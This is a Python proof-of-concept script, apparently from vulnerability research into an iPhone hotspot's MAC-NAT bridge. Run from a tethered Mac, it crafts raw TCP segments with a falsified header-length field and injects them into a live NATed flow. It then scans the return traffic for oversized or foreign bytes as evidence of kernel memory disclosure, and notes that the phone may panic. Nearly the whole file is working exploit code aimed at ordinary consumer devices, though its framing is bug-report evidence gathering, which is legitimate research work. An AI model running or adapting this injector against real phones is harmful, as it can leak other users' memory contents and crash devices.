#!/usr/bin/env python3
#
# macnat_inject.py -- the MAC-NAT seg-count corruption experiment (the Mac side).
#
# THE BUG (findings/2026-11-27_betadiff_bridge_mac_nat.md, corruption-shape
# decode 2026-11-28): the iPhone hotspot bridge's MAC-NAT input walker
# computes the TCP header length from the packet's th_off byte with NO
# th_off<5 / numerator sign check (guards exist only in 27.3b). One crafted
# inbound segment on a NATed flow stores a corrupted seg count at nat+0xa0;
# the egress path then uses that count as BOTH the source offset and the
# copy length of per-segment m_copydata calls -- whose output is transmitted
# in the return traffic of the SAME flow, which WE receive as the hotspot
# client. Receipts: return segments whose length/content do not match the
# server's actual response (the copy confusion), or foreign bytes in the
# payload (the disclosure).
#
# THE EXPERIMENT POSITION: this Mac is the hotspot CLIENT (tethered to the
# iPhone over Wi-Fi or USB). We open a real TCP flow THROUGH the phone's
# NAT, then inject a crafted segment on that 4-tuple claiming th_off=15
# (60-byte header) while carrying only the real 20-byte header -- the
# claimed-vs-actual mismatch is the bug input -- then watch the return
# traffic of that flow.
#
# USAGE (root):
#   sudo python3 tools/macnat_inject.py [--host example.com] [--port 80]
#        [--sweep 8,12,15] [--watch 20]
#
# HONESTY: a segment anomaly = the copy-confusion receipt; foreign bytes =
# the disclosure receipt (card -> fileable evidence); a clean run = the
# honest negative. A phone panic resets the hotspot -- reconnect and rerun.
#

import socket, struct, sys, time, argparse, subprocess, os, fcntl, array

def checksum(data):
    if len(data) & 1:
        data += b'\x00'
    s = sum(array.array('H', data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

def find_hotspot_iface():
    """the interface whose IPv4 is 172.20.10.x (the iPhone hotspot subnet)"""
    import subprocess as sp
    out = sp.check_output(['ifconfig', '-a']).decode(errors='replace')
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith('\t') and not line.startswith(' '):
            cur = line.split(':')[0]
        if cur and 'inet 172.20.10.' in line:
            ip = line.split('inet ')[1].split(' ')[0]
            return cur, ip
    return None, None

def build_tcp_seg(src_ip, dst_ip, sport, dport, seq, ack, flags,
                  th_off_nibble, payload, window=8192):
    """TCP segment with a CLAIMED data-offset that can exceed the real 20B
    header -- the claimed-vs-actual mismatch is the MAC-NAT bug input."""
    # real header is 20 bytes; we CLAIM th_off*4 bytes via the nibble
    off_flags = (th_off_nibble << 12) | flags
    tcp = struct.pack('!HHIIBBHHH', sport, dport, seq, ack,
                      off_flags >> 8, off_flags & 0xFF, window, 0, 0)
    seg = tcp + payload
    # pseudo-header checksum
    ph = struct.pack('!4s4sBBH4s', socket.inet_aton(src_ip),
                     socket.inet_aton(dst_ip), 0, 6, len(seg), b'')
    csum = checksum(ph + seg)
    seg = seg[:16] + struct.pack('!H', csum) + seg[18:]
    ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(seg), 0, 0, 64,
                     6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    return ip + seg

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='93.184.216.34')   # example.com
    ap.add_argument('--port', type=int, default=80)
    ap.add_argument('--sweep', default='8,12,15')         # th_off nibbles
    ap.add_argument('--watch', type=float, default=20)    # seconds per step
    args = ap.parse_args()

    iface, lip = find_hotspot_iface()
    if not iface:
        print('[-] no 172.20.10.x interface found -- tether the Mac to the '
              'iPhone hotspot (Wi-Fi or USB) first.')
        return 1
    print(f'[+] hotspot iface {iface} local ip {lip}')

    # the real flow through the NAT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((args.host, args.port))
    except Exception as e:
        print(f'[-] flow connect failed: {e}')
        return 1
    sport = s.getsockname()[1]
    dst_ip = socket.gethostbyname(args.host)
    print(f'[+] flow established {lip}:{sport} -> {dst_ip}:{args.port}')
    s.send(b'GET / HTTP/1.0\r\nHost: %b\r\n\r\n' % args.host.encode())
    time.sleep(1)
    try:
        s.recv(65536)
    except Exception:
        pass
    seq = 1
    ack = 1
    # harvest the socket's current seq via a sidecar: use SO_GET... not
    # portable; instead inject with a wildcard seq guess and rely on the
    # walker reading th_off from ANY packet of the flow -- the seg-count
    # store happens on the INPUT walker regardless of seq correctness for
    # the NAT entry (the entry is matched by 4-tuple, not seq).
    print('[*] note: the NAT entry matches by 4-tuple; the crafted segment '
          'need not be in-window to reach the walker')

    rx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    rx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rx.bind((lip, 0))
    rx.settimeout(1.0)

    for nib in [int(x) for x in args.sweep.split(',')]:
        print(f'\n=== th_off nibble {nib} (claimed hdr {nib*4}B, real 20B) ===')
        payload = b'MACNATPROBE-' + bytes([nib]) + b'\x00' * 16
        seg = build_tcp_seg(lip, dst_ip, sport, args.port, seq, ack,
                            0x18, nib, payload)      # PSH|ACK
        try:
            rx.sendto(seg, (dst_ip, args.port))
            print(f'[+] injected {len(seg)}B on {lip}:{sport} -> {dst_ip}:{args.port}')
        except Exception as e:
            print(f'[-] inject failed: {e}')
            continue

        # watch the return traffic of this flow for the watch window
        anomalies = 0
        t0 = time.time()
        seen = []
        while time.time() - t0 < args.watch:
            try:
                pkt, addr = rx.recvfrom(65536)
            except socket.timeout:
                continue
            if len(pkt) < 40:
                continue
            ihl = (pkt[0] & 0xF) * 4
            sport_pkt = struct.unpack('!H', pkt[ihl:ihl+2])[0]
            dport_pkt = struct.unpack('!H', pkt[ihl+2:ihl+4])[0]
            # return traffic of OUR flow: src=dst_ip:port, dst=lip:sport
            if addr[0] != dst_ip or sport_pkt != args.port or dport_pkt != sport:
                continue
            th_off = (pkt[ihl+12] >> 4) * 4
            plen = len(pkt) - ihl - th_off
            data = pkt[ihl+th_off:]
            if plen > 0:
                seen.append((plen, data[:48]))
                # the HTTP server response is text; binary/oversized segments
                # are the anomaly receipt
                printable = sum(1 for c in data[:48] if 32 <= c < 127 or c in (9,10,13))
                if plen > 1460 or printable < 24:
                    anomalies += 1
                    print(f'    *** ANOMALY: return segment len={plen} '
                          f'content={data[:32].hex()}')
        for plen, data in seen[:4]:
            print(f'    return seg len={plen} head={data[:32]!r}')
        print(f'[{ "RECEIPT" if anomalies else "clean" }] nibble {nib}: '
              f'{len(seen)} return payloads, {anomalies} anomalies')
        if anomalies:
            print('    -> foreign/oversized content in the return flow: the '
                  'copy-confusion receipt. Card -> fileable evidence.')

    s.close()
    print('\n[=] verdict: run the sweep on the 17 (27.2.1). A clean sweep on '
          'all nibbles = the honest negative; any anomaly row = the receipt.')
    return 0

if __name__ == '__main__':
    sys.exit(main())
